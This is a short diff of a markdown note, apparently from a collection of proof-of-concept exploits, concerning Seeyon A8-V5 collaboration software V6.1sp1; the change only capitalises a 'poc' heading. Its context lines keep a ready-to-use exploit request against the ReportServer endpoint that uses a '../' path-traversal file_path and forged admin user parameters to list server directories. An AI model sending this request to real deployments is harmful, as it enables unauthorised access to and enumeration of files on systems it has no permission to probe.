@@ -8,7 +8,7 @@
 title="致远A8-V5协同管理软件 V6.1sp1"
 ```
 
-## poc
+## POC
 
 ```
 /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
